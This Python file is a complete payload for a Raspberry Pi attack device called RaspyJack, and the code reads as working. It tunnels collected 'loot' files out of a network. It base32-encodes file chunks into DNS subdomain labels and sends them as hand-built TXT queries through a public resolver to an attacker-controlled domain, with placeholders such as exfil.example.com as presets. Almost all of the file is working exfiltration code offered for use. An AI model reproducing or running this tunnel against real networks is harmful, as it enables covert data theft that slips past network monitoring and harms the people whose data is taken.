#!/usr/bin/env python3
"""
RaspyJack Payload -- DNS Exfiltration Tunnel
==============================================
Author: 7h30th3r0n3

Encodes files from the loot directory into base32 DNS subdomain labels
and sends them as TXT queries to a configurable external domain.

Setup / Prerequisites:
  - Edit config at /root/Raspyjack/config/dns_tunnel/config.json.
  - Requires an external domain you control with a DNS server
    logging queries.

Controls:
  OK          -- Start transfer
  UP / DOWN   -- Select file
  LEFT / RIGHT-- Adjust chunk size
  KEY1        -- Set domain (cycle presets / use saved config)
  KEY2        -- (unused)
  KEY3        -- Exit

Config: /root/Raspyjack/config/dns_tunnel/config.json
"""

import os
import sys
import json
import time
import base64
import hashlib
import threading
import struct
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_BASE = "/root/Raspyjack/loot"
LOOT_DIR = os.path.join(LOOT_BASE, "DNSTunnel")
CONFIG_DIR = "/root/Raspyjack/config/dns_tunnel"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
os.makedirs(LOOT_DIR, exist_ok=True)
os.makedirs(CONFIG_DIR, exist_ok=True)

MAX_LABEL_LEN = 63
MAX_NAME_LEN = 253
CHUNK_SIZES = [16, 24, 32, 48, 63]
DEFAULT_CHUNK = 32

PRESET_DOMAINS = [
    "exfil.example.com",
    "data.example.net",
    "tun.example.org",
]

ROWS_VISIBLE = 7
ROW_H = 12

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
transferring = False
stop_flag = False
status_msg = "Idle"
scroll_pos = 0
chunk_idx = 2
domain_idx = 0
current_domain = PRESET_DOMAINS[0]

bytes_sent = 0
chunks_sent = 0
total_chunks = 0
transfer_speed = 0.0

file_list = []


# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

def _load_config():
    global current_domain, domain_idx, chunk_idx
    if not os.path.isfile(CONFIG_FILE):
        return
    try:
        with open(CONFIG_FILE, "r") as f:
            cfg = json.load(f)
        saved_domain = cfg.get("domain", "")
        if saved_domain:
            current_domain = saved_domain
            if saved_domain in PRESET_DOMAINS:
                domain_idx = PRESET_DOMAINS.index(saved_domain)
        saved_chunk = cfg.get("chunk_size", DEFAULT_CHUNK)
        if saved_chunk in CHUNK_SIZES:
            chunk_idx = CHUNK_SIZES.index(saved_chunk)
    except Exception:
        pass


def _save_config():
    cfg = {
        "domain": current_domain,
        "chunk_size": CHUNK_SIZES[chunk_idx],
        "updated": datetime.now().isoformat(),
    }
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(cfg, f, indent=2)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# File enumeration
# ---------------------------------------------------------------------------

def _scan_loot_files():
    """Enumerate files under the loot directory."""
    found = []
    for root, _dirs, files in os.walk(LOOT_BASE):
        for fname in files:
            fpath = os.path.join(root, fname)
            if fpath.startswith(CONFIG_DIR):
                continue
            try:
                size = os.path.getsize(fpath)
                if size > 0:
                    rel = os.path.relpath(fpath, LOOT_BASE)
                    found.append({"path": fpath, "rel": rel, "size": size})
            except Exception:
                pass
    found.sort(key=lambda x: x["rel"])
    return found


# ---------------------------------------------------------------------------
# DNS encoding + sending
# ---------------------------------------------------------------------------

def _encode_chunk(data_bytes):
    """Encode raw bytes to base32 lowercase (DNS-safe)."""
    encoded = base64.b32encode(data_bytes).decode("ascii").lower().rstrip("=")
    return encoded


def _build_query_name(seq, total, file_hash, encoded_data, domain):
    """Build a DNS query name: <seq>.<hash8>.<data>.domain."""
    hash8 = file_hash[:8]
    label = f"{seq}.{hash8}.{encoded_data}"
    full = f"{label}.{domain}"
    if len(full) > MAX_NAME_LEN:
        trim = MAX_NAME_LEN - len(f"{seq}.{hash8}..{domain}") - 1
        encoded_data = encoded_data[:max(1, trim)]
        full = f"{seq}.{hash8}.{encoded_data}.{domain}"
    return full


def _send_dns_query(qname):
    """Send a TXT DNS query using socket (stdlib only)."""
    import socket

    try:
        buf = bytearray()
        txid = struct.pack("!H", int(time.time() * 1000) & 0xFFFF)
        buf.extend(txid)
        buf.extend(b"\x01\x00")
        buf.extend(b"\x00\x01\x00\x00\x00\x00\x00\x00")

        for part in qname.split("."):
            encoded = part.encode("ascii")
            buf.append(len(encoded))
            buf.extend(encoded)
        buf.append(0)
        buf.extend(b"\x00\x10\x00\x01")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        try:
            sock.sendto(bytes(buf), ("8.8.8.8", 53))
            sock.recv(512)
        except socket.timeout:
            pass
        finally:
            sock.close()
        return True
    except Exception:
        return False


def _do_transfer(fpath):
    """Transfer a file via DNS queries in background."""
    global transferring, status_msg, bytes_sent, chunks_sent
    global total_chunks, transfer_speed, stop_flag

    with lock:
        transferring = True
        stop_flag = False
        bytes_sent = 0
        chunks_sent = 0
        status_msg = "Reading file..."

    try:
        with open(fpath, "rb") as f:
            raw = f.read()
    except Exception as exc:
        with lock:
            status_msg = f"Err: {str(exc)[:16]}"
            transferring = False
        return

    chunk_size = CHUNK_SIZES[chunk_idx]
    file_hash = hashlib.sha256(raw).hexdigest()

    chunks = []
    for i in range(0, len(raw), chunk_size):
        chunks.append(raw[i:i + chunk_size])

    with lock:
        total_chunks = len(chunks)
        status_msg = f"Sending {total_chunks} chunks..."

    start_time = time.time()

    for seq, chunk_data in enumerate(chunks):
        with lock:
            if stop_flag:
                status_msg = "Cancelled"
                break

        encoded = _encode_chunk(chunk_data)
        qname = _build_query_name(seq, len(chunks), file_hash, encoded, current_domain)
        _send_dns_query(qname)

        elapsed = time.time() - start_time
        with lock:
            chunks_sent = seq + 1
            bytes_sent += len(chunk_data)
            transfer_speed = bytes_sent / elapsed if elapsed > 0 else 0
            status_msg = f"Chunk {seq + 1}/{total_chunks}"

        time.sleep(0.05)

    with lock:
        if not stop_flag:
            status_msg = f"Done: {bytes_sent}B in {chunks_sent} chunks"
        transferring = False


def start_transfer(fpath):
    with lock:
        if transferring:
            return
    threading.Thread(target=_do_transfer, args=(fpath,), daemon=True).start()


# ---------------------------------------------------------------------------
# Drawing
# ---------------------------------------------------------------------------

def _draw_header(d, title):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), title, font=font, fill="#00CCFF")
    with lock:
        active = transferring
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if active else "#FF0000")


def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text[:24], font=font, fill="#AAA")


def draw_file_selector():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "DNS TUNNEL")

    with lock:
        status = status_msg
        sc = scroll_pos
        bs = bytes_sent
        cs = chunks_sent
        tc = total_chunks
        spd = transfer_speed
        active = transferring

    d.text((2, 15), f"Dom:{current_domain[:16]}", font=font, fill="#888")

    if active:
        d.text((2, 28), status[:22], font=font, fill="#FFAA00")
        progress = cs / tc if tc > 0 else 0
        bar_w = int(100 * progress)
        d.rectangle((14, 42, 114, 50), outline="#444")
        d.rectangle((14, 42, 14 + bar_w, 50), fill="#00AA44")
        d.text((2, 54), f"{bs}B  {spd:.0f}B/s", font=font, fill="#CCCCCC")
        d.text((2, 66), f"Chunk {cs}/{tc}", font=font, fill="#CCCCCC")
    elif not file_list:
        d.text((10, 45), "No loot files found", font=font, fill="#666")
    else:
        chunk_sz = CHUNK_SIZES[chunk_idx]
        d.text((70, 15), f"C:{chunk_sz}B", font=font, fill="#666")

        visible = file_list[sc:sc + ROWS_VISIBLE - 1]
        for i, entry in enumerate(visible):
            y = 28 + i * ROW_H
            marker = ">" if i == 0 else " "
            color = "#FFFF00" if i == 0 else "#CCCCCC"
            name = entry["rel"][:18]
            sz_k = entry["size"] / 1024
            line = f"{marker}{name} {sz_k:.0f}k"
            d.text((1, y), line[:22], font=font, fill=color)

    _draw_footer(d, f"OK:Send K1:Domain K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


def _show_message(line1, line2=""):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((10, 50), line1, font=font, fill="#00FF00")
    if line2:
        d.text((4, 65), line2, font=font, fill="#888")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global scroll_pos, chunk_idx, domain_idx, current_domain
    global stop_flag, file_list

    _load_config()

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 20), "DNS TUNNEL", font=font, fill="#00CCFF")
    d.text((4, 40), "Exfiltrate loot via", font=font, fill="#888")
    d.text((4, 52), "DNS TXT queries", font=font, fill="#888")
    d.text((4, 72), "OK=Send  K1=Domain", font=font, fill="#666")
    d.text((4, 84), "L/R=Chunk  K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.3)

    file_list = _scan_loot_files()

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                with lock:
                    stop_flag = True
                _save_config()
                break

            if btn == "OK":
                with lock:
                    active = transferring
                if active:
                    with lock:
                        stop_flag = True
                elif file_list and scroll_pos < len(file_list):
                    selected = file_list[scroll_pos]
                    start_transfer(selected["path"])
                time.sleep(0.3)

            elif btn == "KEY1":
                domain_idx = (domain_idx + 1) % len(PRESET_DOMAINS)
                current_domain = PRESET_DOMAINS[domain_idx]
                _save_config()
                _show_message("Domain:", current_domain[:20])
                time.sleep(0.2)

            elif btn == "UP":
                scroll_pos = max(0, scroll_pos - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                scroll_pos = min(max(0, len(file_list) - 1), scroll_pos + 1)
                time.sleep(0.15)

            elif btn == "LEFT":
                chunk_idx = max(0, chunk_idx - 1)
                time.sleep(0.15)

            elif btn == "RIGHT":
                chunk_idx = min(len(CHUNK_SIZES) - 1, chunk_idx + 1)
                time.sleep(0.15)

            draw_file_selector()
            time.sleep(0.05)

    finally:
        with lock:
            stop_flag = True
        time.sleep(0.3)
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
